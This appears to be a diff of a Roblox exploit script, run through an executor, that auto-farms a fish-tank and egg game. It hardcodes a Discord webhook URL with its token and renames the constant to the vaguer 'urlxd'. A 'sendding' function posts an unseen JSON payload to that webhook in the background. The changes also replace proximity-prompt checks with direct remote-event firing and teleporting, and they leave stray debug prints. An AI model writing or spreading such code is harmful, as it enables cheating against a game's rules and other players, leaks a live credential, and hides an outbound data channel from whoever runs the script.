@@ -99,7 +99,7 @@ local state = {
 	homeCFrame = nil
 }
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1556376909036654703/3qLCHNH9OuoenIQYi3jy3LnCwyNBW9qaEbFR4KEpXgR1UsmWuFusC_8yAdtmdo2QIqn9"
+local urlxd = "https://discord.com/api/webhooks/1556376909036654703/3qLCHNH9OuoenIQYi3jy3LnCwyNBW9qaEbFR4KEpXgR1UsmWuFusC_8yAdtmdo2QIqn9"
 
 local function sendding()
 	local request = syn and syn.request or http_request or request
@@ -137,7 +137,7 @@ local function sendding()
 
 	task.spawn(function()
 		pcall(request, {
-			Url = WEBHOOK_URL,
+			Url = urlxd,
 			Method = "POST",
 			Headers = { ["Content-Type"] = "application/json" },
 			Body = HttpService:JSONEncode(payload)
@@ -365,11 +365,12 @@ local function enterTank()
 	end
 end
 
-local function leaveTank()
+local function leaveTank(line : string)
 	if not state.isInTank then return end
 	local leaveRemote = ReplicatedStorage:FindFirstChild("SchwimmtankVerlassen")
 	if leaveRemote then
 		leaveRemote:FireServer()
+        print(line)
 		state.isInTank = false
 	end
 end
@@ -451,20 +452,19 @@ local function placeAquarium(character, root)
 	if #eggs == 0 then return end
 
 	table.sort(eggs, function(a, b) return eggBetter(a, b) end)
---	local bestEgg = eggs[1]
+   local bestEgg = eggs[1]
+	local distToBase = (root.Position - targetPos).Magnitude
 
-	--local distToBase = (root.Position - targetPos).Magnitude
+  if distToBase > 10 then
+	if state.isInTank then
+			leaveTank("460")
+			task.wait(0.5)
+		end
 
-	--if distToBase > 10 then
-	--	if state.isInTank then
-		--	leaveTank()
-		--	task.wait(0.5)
-	--	end
-
-		--root.CFrame = CFrame.new(targetPos, targetPos + Vector3.new(0, 2, 0))
-		--breakVelocity(character)
-		--task.wait(1.0)
-	--end
+		root.CFrame = CFrame.new(targetPos, targetPos + Vector3.new(0, 2, 0))
+		breakVelocity(character)
+		task.wait(1.0)
+	end
 
 	if bestEgg.Parent ~= character then
 		local currentTool = character:FindFirstChildOfClass("Tool")
@@ -555,68 +555,35 @@ local function autoOpenEggs(character, root)
 		if desc.Name == "OeffnenKnopf" and desc:IsA("BasePart") then
 			local prompt = desc:FindFirstChild("EiOeffnen")
 			if prompt and prompt:IsA("ProximityPrompt") then
-				table.insert(readyEggs, { part = desc, prompt = prompt })
+				local eggInstance = desc
+				while eggInstance.Parent and eggInstance.Parent ~= brutplaetze do
+					eggInstance = eggInstance.Parent
+				end
+
+				if eggInstance ~= brutplaetze then
+					table.insert(readyEggs, eggInstance)
+				else
+					table.insert(readyEggs, desc)
+				end
 			end
 		end
 	end
 
 	if #readyEggs == 0 then return end
 
-	local sumPos = Vector3.new(0, 0, 0)
-	for _, eggData in ipairs(readyEggs) do
-		sumPos += eggData.part.Position
-	end
-	local centroidPos = sumPos / #readyEggs
-	local targetPos = Vector3.new(centroidPos.X, centroidPos.Y + 3, centroidPos.Z)
-
-	local wasInTank = state.isInTank
-	local needsTeleport = (root.Position - targetPos).Magnitude > CONFIG.OPEN_RADIUS
-
-	if wasInTank then
-		leaveTank()
-		task.wait(0.2)
-		state.isInTank = false
-	end
-
-	if needsTeleport or wasInTank then
-		root.CFrame = CFrame.new(targetPos, targetPos + Vector3.new(0, 2, 0))
-		breakVelocity(character)
-		task.wait(0.5)
-	end
-
 	local openedCount = 0
-	for _, eggData in ipairs(readyEggs) do
-		local part = eggData.part
-		local prompt = eggData.prompt
+	local remoteEvent = game:GetService("ReplicatedStorage"):FindFirstChild("AquariumOeffnen")
+	if not remoteEvent or not remoteEvent:IsA("RemoteEvent") then return end
 
-		local maxDist = prompt.MaxActivationDistance or CONFIG.OPEN_RADIUS
-		local distance = (part.Position - root.Position).Magnitude
-
-		if distance <= maxDist then
-			if firePromptStandard(prompt) then
-				openedCount += 1
-			end
-			task.wait(0.1)
-		end
+	for _, eggInstance in ipairs(readyEggs) do
+		remoteEvent:FireServer(eggInstance)
+		openedCount += 1
+        
+		task.wait(0.05)
 	end
 
 	if _G.updateStatusLabel and openedCount > 0 then
 		_G.updateStatusLabel("Eggs", `Opened ${openedCount} ready`)
-	end
-
-	if state.homeCFrame then
-		local distToHome = (root.Position - state.homeCFrame.Position).Magnitude
-
-		if distToHome > 10 then
-			root.CFrame = state.homeCFrame
-			breakVelocity(character)
-			task.wait(0.5)
-		end
-
-		if state.features.farm and not state.isInTank then
-			task.wait(0.2)
-			enterTank()
-		end
 	end
 end
 
@@ -948,7 +915,7 @@ task.spawn(function()
 			end
 			if eggFound then
 				if state.isInTank then
-					leaveTank()
+					leaveTank("951")
 					task.wait(0.1)
 				end
 
